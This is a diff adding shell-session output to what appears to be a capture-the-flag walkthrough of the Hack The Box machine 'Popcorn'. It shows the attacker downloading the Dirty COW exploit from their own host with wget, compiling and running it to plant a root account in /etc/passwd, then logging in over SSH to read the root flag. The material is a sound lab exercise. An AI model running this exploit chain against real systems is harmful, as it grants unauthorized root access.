@@ -283,4 +283,63 @@ user.txt
 $ cat user.txt
 00c2d970fd3c87f7ff695f505536686f
 
+www-data@popcorn:/home/george$ uname -a
+uname -a
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+www-data@popcorn:/home/george$ whereis gcc
+whereis gcc
+gcc: /usr/bin/gcc /usr/lib/gcc /usr/share/man/man1/gcc.1.gz
+www-data@popcorn:/home/george$ cd /tmp
+cd /tmp
+www-data@popcorn:/tmp$ wget http://10.10.14.4:8000/dirty.c
+wget http://10.10.14.4:8000/dirty.c
+--2022-05-26 17:56:36--  http://10.10.14.4:8000/dirty.c
+Connecting to 10.10.14.4:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4814 (4.7K) [text/plain]
+Saving to: `dirty.c'
+
+100%[======================================>] 4,814       --.-K/s   in 0s
+
+2022-05-26 17:56:37 (123 MB/s) - `dirty.c' saved [4814/4814]
+
+www-data@popcorn:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
+gcc -pthread dirty.c -o dirty -lcrypt
+www-data@popcorn:/tmp$ ./dirty
+./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 123456
+
+Complete line:
+firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
+
+mmap: b785a000
+
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Popcorn_10.10.10.6# ssh firefart@10.10.10.6
+The authenticity of host '10.10.10.6 (10.10.10.6)' can't be established.
+RSA key fingerprint is SHA256:V1Azfw43WixBJWVAsqnBuoCdUrthzn2x6VQiZjAUusk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.6' (RSA) to the list of known hosts.
+
+firefart@10.10.10.6's password:
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+
+  System information as of Thu May 26 17:59:32 EEST 2022
+
+  System load: 1.87              Memory usage: 10%   Processes:       117
+  Usage of /:  7.9% of 14.80GB   Swap usage:   0%    Users logged in: 0
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+Last login: Tue Oct 27 11:08:55 2020
+/usr/bin/X11/xauth:  creating new authority file /root/.Xauthority
+firefart@popcorn:~# id
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart@popcorn:~# cat /root/root.txt
+46d08feee8a01e52edf9fb58344b562d
+firefart@popcorn:~#
 
